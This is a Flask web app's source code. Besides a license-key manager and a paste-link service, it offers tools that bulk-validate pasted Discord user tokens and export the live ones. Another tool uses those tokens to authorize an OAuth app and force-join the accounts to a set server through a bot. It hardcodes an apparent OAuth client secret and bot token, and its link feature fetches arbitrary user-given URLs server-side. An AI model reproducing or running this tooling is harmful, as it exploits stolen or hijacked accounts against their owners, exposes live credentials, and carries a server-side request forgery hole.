import os
import secrets
import string
import hashlib
from datetime import datetime, date, timedelta
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.exceptions import RequestEntityTooLarge
import requests

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "dev-secret")
app.config["SQLALCHEMY_DATABASE_URI"] = os.environ.get("DATABASE_URL", "sqlite:///app.db")
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.permanent_session_lifetime = timedelta(hours=12)
app.config["MAX_CONTENT_LENGTH"] = 10 * 1024 * 1024

db = SQLAlchemy(app)

JOBS: dict[str, dict] = {}


class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(255), unique=True, nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)


class ProductKey(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.id"), nullable=True, index=True)
    guest_id = db.Column(db.String(64), nullable=True, index=True)
    name = db.Column(db.String(255), nullable=False, index=True)
    expires_on = db.Column(db.Date, nullable=False, index=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)


class MockyLink(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.id"), nullable=True, index=True)
    guest_id = db.Column(db.String(64), nullable=True, index=True)
    link_id = db.Column(db.String(32), unique=True, nullable=False, index=True)
    token = db.Column(db.String(64), nullable=True, index=True)
    requires_token = db.Column(db.Boolean, default=True, nullable=False)
    content = db.Column(db.Text, nullable=False)
    external_url = db.Column(db.Text, nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)


class GuestSession(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    guest_id = db.Column(db.String(64), unique=True, nullable=False, index=True)
    ip_hash = db.Column(db.String(64), nullable=False, index=True)
    user_agent_hash = db.Column(db.String(64), nullable=False, index=True)
    mocky_count = db.Column(db.Integer, default=0, nullable=False)
    product_count = db.Column(db.Integer, default=0, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    last_activity = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)


def verify_turnstile(token: str, remote_ip: str | None) -> bool:
    secret = os.environ.get("CLOUDFLARE_TURNSTILE_SECRET")
    if not secret:
        return True
    try:
        r = requests.post(
            "https://challenges.cloudflare.com/turnstile/v0/siteverify",
            data={
                "secret": secret,
                "response": token or "",
                "remoteip": remote_ip or "",
            },
            timeout=10,
        )
        data = r.json()
        return bool(data.get("success"))
    except Exception:
        return False

def check_devtools():
    devtools_indicators = [
        request.headers.get("X-Devtools-Detected"),
        request.headers.get("X-Chrome-Extensions"),
        request.headers.get("X-Firefox-Devtools"),
        request.headers.get("X-Safari-Devtools"),
    ]
    return any(devtools_indicators)

def block_suspicious_access():
    if check_devtools():
        return True
    
    user_agent = request.headers.get("User-Agent", "").lower()
    suspicious_patterns = [
        "selenium", "webdriver", "phantomjs", "headless",
        "automation", "bot", "crawler", "scraper", "python-requests"
    ]
    return any(pattern in user_agent for pattern in suspicious_patterns)


def get_client_fingerprint():
    ip = request.remote_addr or "unknown"
    user_agent = request.headers.get("User-Agent", "unknown")
    ip_hash = hashlib.sha256(ip.encode()).hexdigest()
    ua_hash = hashlib.sha256(user_agent.encode()).hexdigest()
    return ip_hash, ua_hash

def get_or_create_guest_session():
    guest_id = session.get("guest_id")
    if guest_id:
        guest = GuestSession.query.filter_by(guest_id=guest_id).first()
        if guest:
            guest.last_activity = datetime.utcnow()
            db.session.commit()
            return guest
    
    ip_hash, ua_hash = get_client_fingerprint()
    guest_id = ''.join(secrets.SystemRandom().choices(string.ascii_letters + string.digits, k=32))
    guest = GuestSession(guest_id=guest_id, ip_hash=ip_hash, user_agent_hash=ua_hash)
    db.session.add(guest)
    db.session.commit()
    session["guest_id"] = guest_id
    return guest

def require_auth_or_guest():
    user_id = session.get("user_id")
    if user_id:
        user = User.query.get(user_id)
        if user:
            return user, None
    
    guest = get_or_create_guest_session()
    return None, guest

def require_auth():
    user_id = session.get("user_id")
    if not user_id:
        abort(401)
    user = User.query.get(user_id)
    if not user:
        session.clear()
        abort(401)
    return user

def migrate_guest_to_user(user_id):
    guest_id = session.get("guest_id")
    if not guest_id:
        return
    
    MockyLink.query.filter_by(guest_id=guest_id).update({"user_id": user_id, "guest_id": None})
    ProductKey.query.filter_by(guest_id=guest_id).update({"user_id": user_id, "guest_id": None})
    
    GuestSession.query.filter_by(guest_id=guest_id).delete()
    session.pop("guest_id", None)
    db.session.commit()


@app.before_request
def cleanup_and_session():
    if block_suspicious_access():
        return ("Service Unavailable", 503)
    
    try:
        ProductKey.query.filter(ProductKey.expires_on < date.today()).delete()
        db.session.commit()
    except Exception:
        db.session.rollback()


@app.route("/")
def index():
    user = None
    if session.get("user_id"):
        user = User.query.get(session.get("user_id"))
    return render_template("index.html", user=user)


@app.route("/api/checktoken", methods=["GET"])
def checktoken_page():
    return render_template("checktoken.html", title="Check Token Discord", user=User.query.get(session.get("user_id")) if session.get("user_id") else None)


@app.route("/api/checktoken/start", methods=["POST"])
def checktoken_start():
    if block_suspicious_access():
        return ("Service Unavailable", 503)
    data = request.get_json(silent=True) or {}
    tokens_raw = (data.get("tokens") or "").strip()
    if not tokens_raw:
        return jsonify({"success": False, "msg": "Tokens required"}), 400
    tokens = [t.strip() for t in tokens_raw.splitlines() if t.strip()]
    if not tokens:
        return jsonify({"success": False, "msg": "Tokens required"}), 400
    job_id = ''.join(secrets.SystemRandom().choices(string.ascii_lowercase + string.digits, k=12))
    JOBS[job_id] = {"total": len(tokens), "done": 0, "results": [], "live_lines": [], "status": "running"}

    def worker(job_id: str, toks: list[str]):
        for i, token in enumerate(toks, start=1):
            status = {
                "token_prefix": token[:15],
                "live": False,
                "email_verified": False,
                "phone_verified": False,
                "locked": False,
                "unknown": False,
            }
            headers = {"Authorization": token, "Content-Type": "application/json"}
            try:
                r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
            except Exception:
                r = None
            if r is not None and r.status_code == 200:
                status["live"] = True
                try:
                    data = r.json()
                    status["email_verified"] = bool(data.get("verified", False))
                    status["phone_verified"] = data.get("phone") is not None
                except Exception:
                    pass
                try:
                    rr = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers, timeout=10)
                    if rr.status_code == 403:
                        try:
                            d = rr.json()
                            if d.get("code") == 40002:
                                status["locked"] = True
                        except Exception:
                            pass
                except Exception:
                    pass
                JOBS[job_id]["live_lines"].append(token)
            elif r is not None and r.status_code == 403:
                try:
                    d = r.json()
                    if d.get("code") == 40002:
                        status["locked"] = True
                except Exception:
                    status["unknown"] = True
            else:
                status["unknown"] = True

            JOBS[job_id]["results"].append(status)
            JOBS[job_id]["done"] = i
            time.sleep(2)
        JOBS[job_id]["status"] = "finished"

    import threading, time
    threading.Thread(target=worker, args=(job_id, tokens), daemon=True).start()
    return jsonify({"success": True, "job_id": job_id})


@app.route("/api/checktoken/status", methods=["GET"])
def checktoken_status():
    job_id = request.args.get("job_id", "")
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"success": False, "msg": "Not found"}), 404
    percent = int(job["done"] * 100 / max(1, job["total"]))
    return jsonify({"success": True, "status": job["status"], "done": job["done"], "total": job["total"], "percent": percent, "results": job["results"][-4:]})


@app.route("/api/checktoken/download", methods=["GET"])
def checktoken_download():
    from flask import send_file
    import tempfile, threading, os
    job_id = request.args.get("job_id", "")
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"success": False, "msg": "Not found"}), 404
    ts = int(datetime.utcnow().timestamp())
    tmp_dir = tempfile.mkdtemp()
    path = os.path.join(tmp_dir, f"live{ts}.txt")
    with open(path, 'w') as f:
        f.write("\n".join(job.get("live_lines", [])))
    def cleanup(p):
        time.sleep(5)
        try:
            os.remove(p)
            os.rmdir(os.path.dirname(p))
        except Exception:
            pass
    threading.Thread(target=cleanup, args=(path,), daemon=True).start()
    return send_file(path, as_attachment=True, download_name=os.path.basename(path), mimetype='text/plain')

@app.route("/api/joindiscord", methods=["GET"])
def joindiscord_page():
    return render_template("joindiscord.html", title="Join Discord Utility", user=User.query.get(session.get("user_id")) if session.get("user_id") else None)


@app.route("/api/joindiscord/start", methods=["POST"])
def joindiscord_start():
    if block_suspicious_access():
        return ("Service Unavailable", 503)
    data = request.get_json(silent=True) or {}
    tokens_raw = (data.get("tokens") or "").strip()
    if not tokens_raw:
        return jsonify({"success": False, "msg": "Tokens required"}), 400
    tokens = [t.strip() for t in tokens_raw.splitlines() if t.strip()]
    if not tokens:
        return jsonify({"success": False, "msg": "Tokens required"}), 400
    job_id = ''.join(secrets.SystemRandom().choices(string.ascii_lowercase + string.digits, k=12))
    JOBS[job_id] = {"total": len(tokens), "done": 0, "results": [], "live_lines": [], "status": "running"}

    def worker(job_id: str, toks: list[str]):
        CLIENT_ID = "1421135062488977478"
        CLIENT_SECRET = "66d-SXeUrm41Q9b32tf0MsdAaZhHDBDN"
        REDIRECT_URI = "https://phtuankiet.online"
        BOT_TOKEN = "MTQyMTEzNTA2MjQ4ODk3NzQ3OA.G2erlB.nJwL3Yaphi--zqFfyAaTQFxXP5G5upLamDmO0M"
        GUILD_ID = "1421078321952718958"
        
        for i, token in enumerate(toks, start=1):
            status = {
                "token_prefix": token[:15],
                "live": False,
                "join_success": False,
                "dead": False,
                "locked": False
            }
            
            url = f"https://discord.com/api/v9/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify%20guilds.join"
            headers = {
                "authorization": token,
                "content-type": "application/json"
            }
            payload = {
                "guild_id": GUILD_ID,
                "permissions": "0",
                "authorize": True,
                "integration_type": 0,
                "location_context": {
                    "guild_id": "10000",
                    "channel_id": "10000",
                    "channel_type": 10000
                },
                "dm_settings": {
                    "allow_mobile_push": False
                }
            }
            
            try:
                r = requests.post(url, headers=headers, json=payload, timeout=10)
                
                if r.status_code == 401:
                    status["dead"] = True
                elif r.status_code in [200, 201, 204]:
                    try:
                        import re
                        code = None
                        if "location" in r.text:
                            code = re.search(r"code=([^\"}]+)", r.text).group(1)
                        elif "Location" in r.headers:
                            code = re.search(r"code=([^&]+)", r.headers["Location"]).group(1)
                        
                        if code:
                            data_token = {
                                "client_id": CLIENT_ID,
                                "client_secret": CLIENT_SECRET,
                                "grant_type": "authorization_code",
                                "code": code,
                                "redirect_uri": REDIRECT_URI
                            }
                            t = requests.post(
                                "https://discord.com/api/v9/oauth2/token",
                                data=data_token,
                                headers={"Content-Type": "application/x-www-form-urlencoded"},
                                timeout=10
                            )
                            token_json = t.json()
                            
                            if "access_token" in token_json:
                                access_token = token_json["access_token"]
                                
                                u = requests.get(
                                    "https://discord.com/api/users/@me",
                                    headers={"Authorization": f"Bearer {access_token}"},
                                    timeout=10
                                )
                                
                                if u.status_code == 200:
                                    user_id = u.json()["id"]
                                    
                                    j = requests.put(
                                        f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{user_id}",
                                        headers={
                                            "Authorization": f"Bot {BOT_TOKEN}",
                                            "Content-Type": "application/json"
                                        },
                                        json={"access_token": access_token},
                                        timeout=10
                                    )
                                    
                                    if j.status_code in [201, 204]:
                                        status["live"] = True
                                        status["join_success"] = True
                                        JOBS[job_id]["live_lines"].append(token)
                        else:
                            if r.status_code in [200, 201, 204]:
                                status["live"] = True
                                status["join_success"] = True  
                                JOBS[job_id]["live_lines"].append(token)
                    except Exception:
                        pass
                elif r.status_code == 403:
                    status["locked"] = True
                    
            except Exception:
                pass
            JOBS[job_id]["results"].append(status)
            JOBS[job_id]["done"] = i
            time.sleep(3)
        JOBS[job_id]["status"] = "finished"

    import threading, time
    threading.Thread(target=worker, args=(job_id, tokens), daemon=True).start()
    return jsonify({"success": True, "job_id": job_id})


@app.route("/api/joindiscord/status", methods=["GET"])
def joindiscord_status():
    job_id = request.args.get("job_id", "")
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"success": False, "msg": "Not found"}), 404
    percent = int(job["done"] * 100 / max(1, job["total"]))
    return jsonify({"success": True, "status": job["status"], "done": job["done"], "total": job["total"], "percent": percent, "results": job["results"][-4:]})


@app.route("/api/joindiscord/download", methods=["GET"])
def joindiscord_download():
    from flask import send_file
    import tempfile, threading, os
    job_id = request.args.get("job_id", "")
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"success": False, "msg": "Not found"}), 404
    ts = int(datetime.utcnow().timestamp())
    tmp_dir = tempfile.mkdtemp()
    path = os.path.join(tmp_dir, f"joined{ts}.txt")
    with open(path, 'w') as f:
        f.write("\n".join(job.get("live_lines", [])))
    def cleanup(p):
        time.sleep(5)
        try:
            os.remove(p)
            os.rmdir(os.path.dirname(p))
        except Exception:
            pass
    threading.Thread(target=cleanup, args=(path,), daemon=True).start()
    return send_file(path, as_attachment=True, download_name=os.path.basename(path), mimetype='text/plain')

@app.route("/api/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return render_template("login.html")
    data = request.get_json(silent=True) or {}
    email = (data.get("email") or "").strip().lower()
    password = data.get("password") or ""
    token = data.get("captcha") or request.form.get("cf-turnstile-response")
    if not verify_turnstile(token, request.remote_addr):
        return jsonify({"success": False, "msg": "Captcha failed"}), 400
    user = User.query.filter_by(email=email).first()
    if not user or not check_password_hash(user.password_hash, password):
        return jsonify({"success": False, "msg": "Invalid credentials"}), 401
    
    migrate_guest_to_user(user.id)
    session.permanent = True
    session["user_id"] = user.id
    return jsonify({"success": True, "msg": "Logged in"})


@app.route("/api/register", methods=["GET", "POST"])
def register():
    if request.method == "GET":
        return render_template("register.html")
    data = request.get_json(silent=True) or {}
    email = (data.get("email") or "").strip().lower()
    password = data.get("password") or ""
    token = data.get("captcha") or request.form.get("cf-turnstile-response")
    if not verify_turnstile(token, request.remote_addr):
        return jsonify({"success": False, "msg": "Captcha failed"}), 400
    if not email or not password:
        return jsonify({"success": False, "msg": "Email and password required"}), 400
    if User.query.filter_by(email=email).first():
        return jsonify({"success": False, "msg": "Email already registered"}), 400
    user = User(email=email, password_hash=generate_password_hash(password))
    db.session.add(user)
    db.session.commit()
    
    migrate_guest_to_user(user.id)
    session.permanent = True
    session["user_id"] = user.id
    return jsonify({"success": True, "msg": "Registered"})


@app.route("/logout", methods=["POST"]) 
def logout():
    session.clear()
    return jsonify({"success": True})


@app.route("/api/captcha", methods=["POST"])
def get_captcha():
    if block_suspicious_access():
        return "Access Denied", 502
    
    data = request.get_json(silent=True) or {}
    action = data.get("action", "general")
    
    if not verify_turnstile(data.get("token", ""), request.remote_addr):
        return jsonify({"success": False, "msg": "Captcha verification failed"}), 400
    
    return jsonify({"success": True, "msg": "Captcha verified"})


@app.route("/product")
def product():
    user, guest = require_auth_or_guest()
    return render_template("product.html", user=user, guest=guest)


@app.route("/docs")
def docs():
    user = None
    if session.get("user_id"):
        user = User.query.get(session.get("user_id"))
    return render_template("docs.html", user=user)


@app.route("/mocky")
def mocky():
    user, guest = require_auth_or_guest()
    return render_template("mocky.html", user=user, guest=guest)


@app.route("/api/keys", methods=["GET"]) 
def list_keys_auth():
    user, guest = require_auth_or_guest()
    if user:
        keys = ProductKey.query.filter_by(user_id=user.id).order_by(ProductKey.id.desc()).all()
    else:
        keys = ProductKey.query.filter_by(guest_id=guest.guest_id).order_by(ProductKey.id.desc()).all()
    return jsonify([
        {"id": k.id, "key": k.name, "dd/mm/yyyy": k.expires_on.strftime("%d/%m/%Y")} for k in keys
    ])


@app.route("/api/keys", methods=["POST"]) 
def create_key():
    user, guest = require_auth_or_guest()
    data = request.get_json(silent=True) or {}
    token = data.get("captcha")
    if not verify_turnstile(token, request.remote_addr):
        return jsonify({"success": False, "msg": "Captcha failed"}), 400
    
    if guest and guest.product_count >= 5:
        return jsonify({"success": False, "msg": "Guest limit reached (5 keys max). Please register for unlimited access."}), 403
    
    name = (data.get("key") or "").strip()
    date_str = (data.get("date") or "").strip()
    try:
        expires = datetime.strptime(date_str, "%d/%m/%Y").date()
    except Exception:
        return jsonify({"success": False, "msg": "Invalid date"}), 400
    if not name:
        return jsonify({"success": False, "msg": "Key required"}), 400
    
    if user:
        k = ProductKey(user_id=user.id, name=name, expires_on=expires)
    else:
        k = ProductKey(guest_id=guest.guest_id, name=name, expires_on=expires)
        guest.product_count += 1
        guest.last_activity = datetime.utcnow()
    
    db.session.add(k)
    db.session.commit()
    return jsonify({"success": True, "id": k.id})


@app.route("/api/keys/<int:key_id>", methods=["PUT"]) 
def edit_key(key_id: int):
    user, guest = require_auth_or_guest()
    data = request.get_json(silent=True) or {}
    name = (data.get("key") or "").strip()
    date_str = (data.get("date") or "").strip()
    try:
        expires = datetime.strptime(date_str, "%d/%m/%Y").date() if date_str else None
    except Exception:
        return jsonify({"success": False, "msg": "Invalid date"}), 400
    
    if user:
        k = ProductKey.query.filter_by(id=key_id, user_id=user.id).first()
    else:
        k = ProductKey.query.filter_by(id=key_id, guest_id=guest.guest_id).first()
    
    if not k:
        return jsonify({"success": False, "msg": "Not found"}), 404
    if name:
        k.name = name
    if expires:
        k.expires_on = expires
    db.session.commit()
    return jsonify({"success": True})


@app.route("/api/keys/<int:key_id>", methods=["DELETE"]) 
def delete_key(key_id: int):
    user, guest = require_auth_or_guest()
    if user:
        k = ProductKey.query.filter_by(id=key_id, user_id=user.id).first()
    else:
        k = ProductKey.query.filter_by(id=key_id, guest_id=guest.guest_id).first()
    
    if not k:
        return jsonify({"success": False, "msg": "Not found"}), 404
    db.session.delete(k)
    db.session.commit()
    return jsonify({"success": True})


@app.route("/api/checkkey", methods=["POST"]) 
def api_check_key():
    data = request.get_json(silent=True) or {}
    key_value = (data.get("key") or "").strip()
    if not key_value:
        return jsonify({"success": False, "msg": "Key required"}), 400
    k = ProductKey.query.filter_by(name=key_value).first()
    if not k:
        return jsonify({"success": False, "msg": "Key not found"}), 404
    if k.expires_on < date.today():
        return jsonify({"success": False, "msg": "Key expired", "expires": k.expires_on.strftime("%d/%m/%Y")}), 410
    return jsonify({"success": True, "msg": "Key valid", "expires": k.expires_on.strftime("%d/%m/%Y")})


@app.route("/api/listkey", methods=["POST"]) 
def api_list_key():
    data = request.get_json(silent=True) or {}
    email = (data.get("email") or "").strip().lower()
    password = data.get("password") or ""
    user = User.query.filter_by(email=email).first()
    if not user or not check_password_hash(user.password_hash, password):
        return jsonify({"success": False, "msg": "Invalid credentials"}), 401
    keys = ProductKey.query.filter_by(user_id=user.id).order_by(ProductKey.id.desc()).all()
    return jsonify({
        "success": True,
        "keys": [
            {"key": k.name, "dd/mm/yyyy": k.expires_on.strftime("%d/%m/%Y")} for k in keys
        ],
    })


@app.route("/api/editkey", methods=["POST"]) 
def api_edit_key():
    data = request.get_json(silent=True) or {}
    email = (data.get("email") or "").strip().lower()
    password = data.get("password") or ""
    old_key = (data.get("old_key") or "").strip()
    new_key = (data.get("new_key") or "").strip()
    date_str = (data.get("dd/mm/yyyy") or data.get("date") or "").strip()
    user = User.query.filter_by(email=email).first()
    if not user or not check_password_hash(user.password_hash, password):
        return jsonify({"success": False, "msg": "Invalid credentials"}), 401
    k = ProductKey.query.filter_by(user_id=user.id, name=old_key).first()
    if not k:
        return jsonify({"success": False, "msg": "Key not found"}), 404
    if new_key:
        k.name = new_key
    if date_str:
        try:
            k.expires_on = datetime.strptime(date_str, "%d/%m/%Y").date()
        except Exception:
            return jsonify({"success": False, "msg": "Invalid date"}), 400
    db.session.commit()
    return jsonify({"success": True, "msg": "Updated"})


@app.route("/api/mocky", methods=["GET"])
def list_mocky_links():
    user, guest = require_auth_or_guest()
    if user:
        links = MockyLink.query.filter_by(user_id=user.id).order_by(MockyLink.id.desc()).all()
    else:
        links = MockyLink.query.filter_by(guest_id=guest.guest_id).order_by(MockyLink.id.desc()).all()
    
    result = []
    for l in links:
        link_data = {
            "id": l.id, 
            "link_id": l.link_id, 
            "content": l.content[:100] + "..." if len(l.content) > 100 else l.content, 
            "created_at": l.created_at.strftime("%d/%m/%Y %H:%M"),
            "token": l.token
        }
        # Handle backward compatibility for requires_token field
        if hasattr(l, 'requires_token'):
            link_data["requires_token"] = l.requires_token
        else:
            link_data["requires_token"] = True  # Default to True for old records
        result.append(link_data)
    
    return jsonify(result)


@app.route("/api/mocky", methods=["POST"])
def create_mocky_link():
    user, guest = require_auth_or_guest()
    
    content = ""
    captcha_token = None
    requires_token = True
    external_url = None
    
    # Support JSON (manual) and multipart (file upload) without loading large files into JSON payloads
    if request.content_type and request.content_type.startswith("multipart/form-data"):
        captcha_token = request.form.get("captcha")
        requires_token = (request.form.get("requires_token") == "true")
        external_url = (request.form.get("external_url") or "").strip()
        content = (request.form.get("content") or "").strip()
    elif request.is_json:
        data = request.get_json(silent=True) or {}
        captcha_token = data.get("captcha")
        requires_token = data.get("requires_token", True)
        external_url = (data.get("external_url") or "").strip()
        content = (data.get("content") or "").strip()
    else:
        captcha_token = request.form.get("captcha")
        requires_token = (request.form.get("requires_token") == "true")
        external_url = (request.form.get("external_url") or "").strip()
        content = (request.form.get("content") or "").strip()
    
    if not verify_turnstile(captcha_token, request.remote_addr):
        return jsonify({"success": False, "msg": "Captcha failed"}), 400
    if not content and not external_url:
        return jsonify({"success": False, "msg": "Content or external_url required"}), 400
    
    if guest and guest.mocky_count >= 5:
        return jsonify({"success": False, "msg": "Guest limit reached (5 links max). Please register for unlimited access."}), 403
    
    link_id = ''.join(secrets.SystemRandom().choices(string.ascii_lowercase + string.digits, k=16))
    token_value = ''.join(secrets.SystemRandom().choices(string.ascii_letters + string.digits, k=32)) if requires_token else None
    
    # Normalize if external_url provided
    ext_url = None
    if external_url:
        if not (external_url.startswith("http://") or external_url.startswith("https://")):
            return jsonify({"success": False, "msg": "Invalid external_url"}), 400
        ext_url = external_url
        if not content:
            content = "External storage"

    if user:
        link = MockyLink(user_id=user.id, link_id=link_id, token=token_value, requires_token=requires_token, content=content, external_url=ext_url)
    else:
        link = MockyLink(guest_id=guest.guest_id, link_id=link_id, token=token_value, requires_token=requires_token, content=content, external_url=ext_url)
        guest.mocky_count += 1
        guest.last_activity = datetime.utcnow()
    
    db.session.add(link)
    db.session.commit()
    return jsonify({"success": True, "id": link.id, "link_id": link_id, "token": token_value, "requires_token": requires_token})


@app.route("/api/mocky/<int:link_id>", methods=["PUT"])
def edit_mocky_link(link_id: int):
    user, guest = require_auth_or_guest()
    content = ""
    external_url = None
    requires_token = True
    if request.content_type and request.content_type.startswith("multipart/form-data"):
        requires_token = (request.form.get("requires_token") == "true")
        external_url = (request.form.get("external_url") or "").strip()
        content = (request.form.get("content") or "").strip()
    else:
        data = request.get_json(silent=True) or {}
        content = (data.get("content") or "").strip()
        requires_token = data.get("requires_token", True)
        external_url = (data.get("external_url") or "").strip()
    if not content and not external_url:
        return jsonify({"success": False, "msg": "Content or external_url required"}), 400
    
    if user:
        link = MockyLink.query.filter_by(id=link_id, user_id=user.id).first()
    else:
        link = MockyLink.query.filter_by(id=link_id, guest_id=guest.guest_id).first()
    
    if not link:
        return jsonify({"success": False, "msg": "Not found"}), 404
    
    if external_url:
        if not (external_url.startswith("http://") or external_url.startswith("https://")):
            return jsonify({"success": False, "msg": "Invalid external_url"}), 400
        link.external_url = external_url
        if not content:
            content = "External storage"
        link.content = content
    else:
        link.content = content
        link.external_url = None
    link.requires_token = requires_token
    
    # Update token based on requires_token setting
    if requires_token and not link.token:
        # Generate new token if switching from no-token to token-required
        link.token = ''.join(secrets.SystemRandom().choices(string.ascii_letters + string.digits, k=32))
    elif not requires_token:
        # Remove token if switching to no-token
        link.token = None
    
    db.session.commit()
    return jsonify({"success": True})


@app.route("/api/mocky/<int:link_id>", methods=["DELETE"])
def delete_mocky_link(link_id: int):
    user, guest = require_auth_or_guest()
    if user:
        link = MockyLink.query.filter_by(id=link_id, user_id=user.id).first()
    else:
        link = MockyLink.query.filter_by(id=link_id, guest_id=guest.guest_id).first()
    
    if not link:
        return jsonify({"success": False, "msg": "Not found"}), 404

    external_deleted = None
    if getattr(link, 'external_url', None):
        try:
            from urllib.parse import urlparse
            parsed = urlparse(link.external_url)
            external_base = f"{parsed.scheme}://{parsed.netloc}"
            resp = requests.delete(f"{external_base}/delete", json={"link": link.external_url}, timeout=20)
            external_deleted = (200 <= resp.status_code < 300)
        except Exception:
            external_deleted = False

    db.session.delete(link)
    db.session.commit()
    return jsonify({"success": True, "external_deleted": external_deleted})


@app.route("/m/<link_id>", methods=["GET", "POST"])
def view_mocky_link(link_id: str):
    link = MockyLink.query.filter_by(link_id=link_id).first()
    if not link:
        return "Link not found", 404
    
    # Handle backward compatibility - default to True if requires_token doesn't exist
    requires_token = getattr(link, 'requires_token', True)
    
    if requires_token:
        if request.method == "GET":
            return "Access denied. Use POST with Authorization header.", 403
        auth_header = request.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            return "Invalid authorization", 401
        token = auth_header[7:]
        if token != link.token:
            return "Invalid token", 401
    else:
        if request.method == "GET":
            return "Access denied. Use POST request.", 403
    
    # Serve external content if present
    if getattr(link, 'external_url', None):
        try:
            resp = requests.get(link.external_url, timeout=20)
            if resp.status_code == 200:
                return resp.text, 200, {"Content-Type": "text/plain; charset=utf-8"}
            return "Upstream fetch failed", 502
        except Exception:
            return "Upstream error", 502
    return link.content, 200, {"Content-Type": "text/plain; charset=utf-8"}


@app.errorhandler(413)
def handle_file_too_large(e: RequestEntityTooLarge):
    return jsonify({"success": False, "msg": "File too large (max 10MB)"}), 413


def migrate_database():
    with app.app_context():
        try:
            from sqlalchemy import text
            # Check if requires_token column exists
            result = db.session.execute(text("PRAGMA table_info(mocky_link)"))
            columns = [row[1] for row in result.fetchall()]
            
            if 'requires_token' not in columns:
                print("Adding requires_token column to mocky_link table...")
                db.session.execute(text("ALTER TABLE mocky_link ADD COLUMN requires_token BOOLEAN DEFAULT 1"))
                db.session.commit()
                print("Migration completed successfully!")
            else:
                print("Database already up to date.")
            
            # Check if token column allows NULL
            result = db.session.execute(text("PRAGMA table_info(mocky_link)"))
            for row in result.fetchall():
                if row[1] == 'token':  # column name
                    if row[3] == 0:  # notnull = 0 means allows NULL
                        print("Token column already allows NULL.")
                    else:
                        print("Updating token column to allow NULL...")
                        # SQLite doesn't support ALTER COLUMN, so we need to recreate the table
                        db.session.execute(text("""
                            CREATE TABLE mocky_link_new (
                                id INTEGER PRIMARY KEY,
                                user_id INTEGER,
                                guest_id VARCHAR(64),
                                link_id VARCHAR(32) UNIQUE NOT NULL,
                                token VARCHAR(64),
                                requires_token BOOLEAN DEFAULT 1 NOT NULL,
                                content TEXT NOT NULL,
                                created_at DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL,
                                FOREIGN KEY(user_id) REFERENCES user (id)
                            )
                        """))
                        
                        db.session.execute(text("""
                            INSERT INTO mocky_link_new 
                            SELECT id, user_id, guest_id, link_id, token, 
                                   COALESCE(requires_token, 1), content, created_at 
                            FROM mocky_link
                        """))
                        
                        db.session.execute(text("DROP TABLE mocky_link"))
                        db.session.execute(text("ALTER TABLE mocky_link_new RENAME TO mocky_link"))
                        
                        # Recreate indexes
                        db.session.execute(text("CREATE INDEX ix_mocky_link_user_id ON mocky_link (user_id)"))
                        db.session.execute(text("CREATE INDEX ix_mocky_link_guest_id ON mocky_link (guest_id)"))
                        db.session.execute(text("CREATE INDEX ix_mocky_link_link_id ON mocky_link (link_id)"))
                        db.session.execute(text("CREATE INDEX ix_mocky_link_token ON mocky_link (token)"))
                        db.session.execute(text("CREATE INDEX ix_mocky_link_requires_token ON mocky_link (requires_token)"))
                        
                        db.session.commit()
                        print("Token column updated to allow NULL!")
                    break
            # Add external_url column if missing
            result = db.session.execute(text("PRAGMA table_info(mocky_link)"))
            columns = [row[1] for row in result.fetchall()]
            if 'external_url' not in columns:
                print("Adding external_url column to mocky_link table...")
                db.session.execute(text("ALTER TABLE mocky_link ADD COLUMN external_url TEXT"))
                db.session.commit()
                print("external_url column added.")
        except Exception as e:
            print(f"Migration error: {e}")
            db.session.rollback()

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
        migrate_database()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))

